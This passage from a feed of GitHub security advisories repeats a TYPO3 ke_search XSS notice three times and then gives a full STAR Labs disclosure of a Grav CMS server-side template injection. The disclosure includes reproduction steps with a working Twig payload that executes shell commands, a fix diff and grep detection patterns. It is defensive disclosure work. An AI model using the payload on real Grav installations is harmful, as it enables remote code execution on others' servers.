            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-27T19:51:00.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-27T19:51:00.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35783\">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-004\">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720\">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6\">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>\n<li><a href=\"https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74\">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4m6-x2xj-jc7w\">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w",
            "title": "[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting",
            "date_modified": "2023-06-27T19:51:00.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Hi,</p>\n<p>actually we have sent the bug report to <a href=\"mailto:security@getgrav.org\">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>\n<h1 id=\"grav-server-side-template-injection-ssti-via-twig-default-filters\">Grav Server-side Template Injection (SSTI) via Twig Default Filters</h1>\n<h2 id=\"summary\">Summary:</h2>\n<table>\n<thead>\n<tr>\n<th><strong>Product</strong></th>\n<th>Grav CMS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Vendor</strong></td>\n<td>Grav</td>\n</tr>\n<tr>\n<td><strong>Severity</strong></td>\n<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>\n</tr>\n<tr>\n<td><strong>Affected Versions</strong></td>\n<td>&lt;= <a href=\"https://github.com/getgrav/grav/tree/1.7.40\">v1.7.40</a> (Commit <a href=\"https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61\">685d762</a>) (Latest version as of writing)</td>\n</tr>\n<tr>\n<td><strong>Tested Versions</strong></td>\n<td>v1.7.40</td>\n</tr>\n<tr>\n<td><strong>Internal Identifier</strong></td>\n<td>STAR-2023-0008</td>\n</tr>\n<tr>\n<td><strong>CVE Identifier</strong></td>\n<td>TBD</td>\n</tr>\n<tr>\n<td><strong>CWE(s)</strong></td>\n<td>CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>\n</tr>\n</tbody></table>\n<h2 id=\"cvss31-scoring-system\">CVSS3.1 Scoring System:</h2>\n<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>\n<table>\n<thead>\n<tr>\n<th><strong>Metric</strong></th>\n<th><strong>Value</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Attack Vector (AV)</strong></td>\n<td>Network</td>\n</tr>\n<tr>\n<td><strong>Attack Complexity (AC)</strong></td>\n<td>Low</td>\n</tr>\n<tr>\n<td><strong>Privileges Required (PR)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>User Interaction (UI)</strong></td>\n<td>None</td>\n</tr>\n<tr>\n<td><strong>Scope (S)</strong></td>\n<td>Unchanged</td>\n</tr>\n<tr>\n<td><strong>Confidentiality (C)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Integrity (I)</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>Availability (A)</strong></td>\n<td>High</td>\n</tr>\n</tbody></table>\n<h2 id=\"product-overview\">Product Overview:</h2>\n<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>\n<h2 id=\"vulnerability-summary\">Vulnerability Summary:</h2>\n<p>The patch for <a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">CVE-2022-2073</a>, a server-side template injection vulnerability in Grav leveraging the default <code>filter()</code> function, did not block other built-in functions exposed by Twig's Core Extension that could be used to invoke arbitrary unsafe functions, thereby allowing for remote code execution.</p>\n<h2 id=\"vulnerability-details\">Vulnerability Details:</h2>\n<p>Twig comes with an extension known as the <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php\">Core Extension</a> that is enabled by default when initialising a new <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148\">Twig environment</a>. Twig's Core Extension provides multiple built-in filters, such as the <code>filter()</code> function, which can be used in Twig templates. </p>\n<p><a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">CVE-2022-2073</a> leverages the default <code>filter()</code> filter function in Twig to invoke arbitrary unsafe functions. This was patched by overriding the default <code>filter()</code> filter function in commit <a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">9d6a2d</a> of Grav v1.7.34 to perform validation checks on the arguments passed to <code>filter()</code>:</p>\n<pre><code class=\"language-diff\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // Security fix\n+           new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),\n        ];\n    }\n    \n    ...\n\n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function filterFilter(Environment $env, $array, $arrow)\n+   {\n+       if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |filter(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_filter($env, $array, $arrow);\n+   }\n}\n</code></pre>\n<p>However, looking at the source code of <a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php\">/src/Extension/CoreExtension.php</a> of Twig, alternative default Twig filters could also be used invoke arbitrary functions:</p>\n<pre><code class=\"language-php\">...\nclass CoreExtension extends AbstractExtension\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // array helpers\n            ...\n            new TwigFilter('filter', 'twig_array_filter', ['needs_environment' =&gt; true]), // unsafe\n            new TwigFilter('map', 'twig_array_map', ['needs_environment' =&gt; true]), // unsafe\n            new TwigFilter('reduce', 'twig_array_reduce', ['needs_environment' =&gt; true]), // unsafe\n        ];\n    }\n</code></pre>\n<p>The three filter functions above respectively call <code>array_filter()</code>, <code>array_map()</code> and <code>array_reduce()</code>. Since only <code>filter()</code> is being overriden by Grav to ensure that the callable passed to <code>filter()</code> does not result in the invocation of an unsafe function, the other two functions (i.e. <code>map()</code> and <code>reduce()</code>) could be used by an authenticated attacker that is able to inject and render malicious templates to gain remote code execution.</p>\n<h2 id=\"exploit-conditions\">Exploit Conditions:</h2>\n<p>This vulnerability can be exploited if the attacker has access to:</p>\n<ol>\n<li>an administrator account, or</li>\n<li>a non-administrator, user account that are granted the following permissions:<ul>\n<li>login access to Grav admin panel, and</li>\n<li>page creation or update rights</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"reproduction-steps\">Reproduction Steps:</h2>\n<ol>\n<li>Log in to Grav Admin using an administrator account.</li>\n<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>\n<li>Login to Admin - Allowed</li>\n<li>Page Update - Allowed</li>\n</ul>\n</li>\n<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>\n<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>\n<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>\n<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class=\"language-twig\">{{ ['id'] | map('system') }}\n{{ ['id'] | reduce('system') }}\n</code></pre>\n</li>\n<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>\n</ol>\n<h2 id=\"suggested-mitigations\">Suggested Mitigations:</h2>\n<p>Override the built-in Twig <code>map()</code> and <code>reduce()</code> filter functions in <code>system/src/Grav/Common/Twig/Extension/GravExtension.php</code> to validate the argument passed to the filter in <code>$arrow</code>.</p>\n<p>For example:</p>\n<pre><code class=\"language-diff\">...\nclass GravExtension extends AbstractExtension implements GlobalsInterface\n{\n    ...\n    public function getFilters(): array\n    {\n        return [\n            ...\n            // Security fix\n            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),\n+           new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),\n+           new TwigFilter('reduce', [$this, 'reduceFilter'], ['needs_environment' =&gt; true]),\n        ];\n    }\n\n    ...\n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function mapFilter(Environment $env, $array, $arrow)\n+   {\n+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |map(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_map($env, $array, $arrow);\n+   }\n+ \n+   /**\n+    * @param Environment $env\n+    * @param array $array\n+    * @param callable|string $arrow\n+    * @return array|CallbackFilterIterator\n+    * @throws RuntimeError\n+    */\n+   function reduceFilter(Environment $env, $array, $arrow)\n+   {\n+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\n+           throw new RuntimeError('Twig |reduce(\"' . $arrow . '\") is not allowed.');\n+       }\n+\n+       return \\twig_array_reduce($env, $array, $arrow);\n+   }\n}\n</code></pre>\n<h2 id=\"detection-guidance\">Detection Guidance:</h2>\n<p>The following strategies may be used to detect potential exploitation attempts.</p>\n<ol>\n<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\(' /path/to/webroot/user/pages/</code></li>\n<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\('  --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>\n<li>Searching within Twig cache using the following shell command:<br><code>grep -Priz -e 'twig_array_(map|reduce)' /path/to/webroot/cache/twig/</code></li>\n<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '\\|\\s*(map|reduce)\\s*\\(' /path/to/webroot/cache/compiled/files/</code></li>\n</ol>\n<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>\n<h2 id=\"credits\">Credits:</h2>\n<p>Ngo Wei Lin (<a href=\"https://twitter.com/Creastery\">@Creastery</a>) &amp; Wang Hengyue (<a href=\"https://twitter.com/w_hy_04\">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href=\"https://twitter.com/starlabs_sg\">@starlabs_sg</a>)</p>\n<h2 id=\"vulnerability-disclosure\">Vulnerability Disclosure:</h2>\n<p>This vulnerability report is subject to a 120 day disclosure deadline as per <a href=\"https://starlabs.sg/advisories/STAR%20Labs%20SG%20Pte.%20Ltd.%20Vulnerability%20Disclosure%20Policy.pdf\">STAR Labs SG Pte. Ltd.'s Vulnerability Disclosure Policy</a>. After 120 days have elapsed, the vulnerability report will be published to the public by <a href=\"https://starlabs.sg/\">STAR Labs SG Pte. Ltd.</a> (STAR Labs).  </p>\n<p>The scheduled disclosure date is <em><strong>25th July, 2023</strong></em>. Disclosure at an earlier date is also possible if agreed upon by all parties.  </p>\n<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>\n<ol>\n<li><strong>CVE-2023-30596</strong>\n Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>GravExtension.filterFilter()</code> and to achieve remote code execution via Twig's default filters <code>map()</code> and <code>reduce()</code>. This is a bypass of CVE-2022-2073.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8\">https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34448\">https://nvd.nist.gov/vuln/detail/CVE-2023-34448</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec\">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b\">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8\">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5\">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>\n<li><a href=\"https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148\">https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148</a></li>\n<li><a href=\"https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/\">https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/</a></li>\n<li><a href=\"https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83\">https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-whr7-m3f8-mpm8\">https://github.com/advisories/GHSA-whr7-m3f8-mpm8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-whr7-m3f8-mpm8",
            "title": "[getgrav/grav] Grav Server-side Template Injection (SSTI) via Twig Default Filters",
            "date_modified": "2023-06-16T19:37:08.000Z",
            "date_published": "2023-06-16T19:37:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-whr7-m3f8-mpm8"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}